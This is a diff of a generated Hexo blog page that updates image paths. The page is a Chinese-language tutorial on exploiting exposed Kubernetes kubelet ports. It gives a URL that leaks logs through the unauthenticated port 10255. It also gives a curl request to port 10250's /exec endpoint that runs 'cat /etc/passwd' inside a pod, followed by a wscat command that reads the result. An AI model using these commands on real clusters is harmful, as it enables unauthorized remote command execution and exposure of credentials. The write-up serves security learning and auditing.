@@ -15,16 +15,16 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="一、简介kubernetes 是一个分布式的集群管理系统，在每个节点（node）上都要运行一个kubelet对容器进行生命周期的管理。kubelet开放的端口有：  4194：cAdvisor 监听，kublet 通过该端口可以获取到该节点的环境信息以及 node 上运行的容器状态等内容，访问 http:&#x2F;&#x2F;localhost:4194 可以看到 cAdvisor 的管理界面，通过 kubelet">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/2020/12/31/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_205409.png">
-<meta property="og:image" content="http://yoursite.com/2020/12/31/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_210737.png">
-<meta property="og:image" content="http://yoursite.com/2020/12/31/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_211334.png">
-<meta property="og:image" content="http://yoursite.com/2020/12/31/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_212648.png">
-<meta property="og:image" content="http://yoursite.com/2020/12/31/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_213305.png">
+<meta property="og:image" content="http://yoursite.com/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_205409-1609400201389.png">
+<meta property="og:image" content="http://yoursite.com/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_210737-1609400268152.png">
+<meta property="og:image" content="http://yoursite.com/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_211334-1609400284716.png">
+<meta property="og:image" content="http://yoursite.com/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_212648-1609400293769.png">
+<meta property="og:image" content="http://yoursite.com/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_213305-1609400308354.png">
 <meta property="article:published_time" content="2020-12-31T07:18:02.877Z">
-<meta property="article:modified_time" content="2020-12-31T07:32:45.370Z">
+<meta property="article:modified_time" content="2020-12-31T07:38:30.526Z">
 <meta property="article:author" content="sqlmaping">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/12/31/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_205409.png">
+<meta name="twitter:image" content="http://yoursite.com/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_205409-1609400201389.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -183,12 +183,12 @@
         <h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>kubernetes 是一个分布式的集群管理系统，在每个节点（node）上都要运行一个kubelet对容器进行生命周期的管理。<br>kubelet开放的端口有： </p>
 <p>4194：cAdvisor 监听，kublet 通过该端口可以获取到该节点的环境信息以及 node 上运行的容器状态等内容，访问 <a href="http://localhost:4194/" target="_blank" rel="noopener">http://localhost:4194</a> 可以看到 cAdvisor 的管理界面，通过 kubelet 的启动参数 –cadvisor-port 可以指定启动的端口。<br>10248：健康检查端口，健康检查通过访问该端口可以判断 kubelet 是否正常工作，通过 kubelet 的启动参数 –healthz-port 和 –healthz-bind-address 来指定监听的地址和端口。<br>10250：kubelet API，kubelet server 与 apiserver 通信的端口，定期请求 apiserver 获取自己所应当处理的任务，通过该端口可以访问获取node资源以及状态。<br>10255：readonly API，提供了pod和node的信息，接口以只读形式暴露出去，访问该端口不需要认证和鉴权。</p>
 <h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><p>kubernetes主要漏洞有端口开放泄露敏感信息，10255端口如果对外开放，攻击者利用公开api可以获取敏感信息。更严重的漏洞是开放10250端口，可能存在远程命令执行漏洞。通过以使用kubernetes的某应用为例说明漏洞的利用方法。<br>首先确定该应用使用了kubernetes，并开放了4个端口。  </p>
-<p><img src="../images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_205409.png" alt="2019-10-22_205409"> </p>
-<h2 id="1、10255端口泄露敏感信息"><a href="#1、10255端口泄露敏感信息" class="headerlink" title="1、10255端口泄露敏感信息"></a>1、10255端口泄露敏感信息</h2><p>该漏洞利用比较简单，直接在浏览器中访问：<a href="http://X.X.X.X:10255/logs/" target="_blank" rel="noopener">http://X.X.X.X:10255/logs/</a> ，或者其他api也行，查看是否存在响应数据，如果存在，则暴露出敏感信息。<br><img src="../images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_210737.png" alt="2019-10-22_210737"></p>
+<p><img src="/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_205409-1609400201389.png" alt="2019-10-22_205409"> </p>
+<h2 id="1、10255端口泄露敏感信息"><a href="#1、10255端口泄露敏感信息" class="headerlink" title="1、10255端口泄露敏感信息"></a>1、10255端口泄露敏感信息</h2><p>该漏洞利用比较简单，直接在浏览器中访问：<a href="http://X.X.X.X:10255/logs/" target="_blank" rel="noopener">http://X.X.X.X:10255/logs/</a> ，或者其他api也行，查看是否存在响应数据，如果存在，则暴露出敏感信息。<br><img src="/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_210737-1609400268152.png" alt="2019-10-22_210737"></p>
 <h2 id="2、远程命令执行漏洞"><a href="#2、远程命令执行漏洞" class="headerlink" title="2、远程命令执行漏洞"></a>2、远程命令执行漏洞</h2><p>该漏洞的利用相对复杂一点，首先需要访问<a href="https://X.X.X.X:10250/pods/，确认10250端口对外开放。如果开放，则进行下一步，需要一台linux主机执行以下指令：" target="_blank" rel="noopener">https://X.X.X.X:10250/pods/，确认10250端口对外开放。如果开放，则进行下一步，需要一台linux主机执行以下指令：</a><br>curl –insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io” -X POST “<a href="https://X.X.X.X:10250/exec/" target="_blank" rel="noopener">https://X.X.X.X:10250/exec/</a><namespace>/<podname>/<container-name>?command=cat&amp;command=/etc/passwd&amp;input=1&amp;output=1&amp;tty=1”<br>command就是要远程执行的命令，本例是cat /etc/passwd。很明显需要确定三个参数，namespace、podname和container-name，此时又需要在<a href="https://X.X.X.X:10250/pods/页面中选择一个pod，如下图：" target="_blank" rel="noopener">https://X.X.X.X:10250/pods/页面中选择一个pod，如下图：</a> </p>
-<p> <img src="../images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_211334.png" alt="2019-10-22_211334"><br>构造好curl请求之后，得到执行结果，其中location就是所需要的websocket地址。 </p>
-<p><img src="../images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_212648.png" alt="2019-10-22_212648"> </p>
-<p>然后在使用wscat工具连接websocket。在windows下安装wscat，需要先安装node和npm。wscat命令为：<br>wscat -c “<a href="https://X.X.X.X:10250/location的值&quot;" target="_blank" rel="noopener">https://X.X.X.X:10250/location的值&quot;</a> –no-check<br>查看响应值，确定命令执行成功。<br><img src="../images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_213305.png" alt="2019-10-22_213305"></p>
+<p><img src="/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_211334-1609400284716.png" alt="2019-10-22_211334"><br>构造好curl请求之后，得到执行结果，其中location就是所需要的websocket地址。 </p>
+<p><img src="/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_212648-1609400293769.png" alt="2019-10-22_212648"> </p>
+<p>然后在使用wscat工具连接websocket。在windows下安装wscat，需要先安装node和npm。wscat命令为：<br>wscat -c “<a href="https://X.X.X.X:10250/location的值&quot;" target="_blank" rel="noopener">https://X.X.X.X:10250/location的值&quot;</a> –no-check<br>查看响应值，确定命令执行成功。<br><img src="/images/kubelet%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2019-10-22_213305-1609400308354.png" alt="2019-10-22_213305"></p>
 
       
 
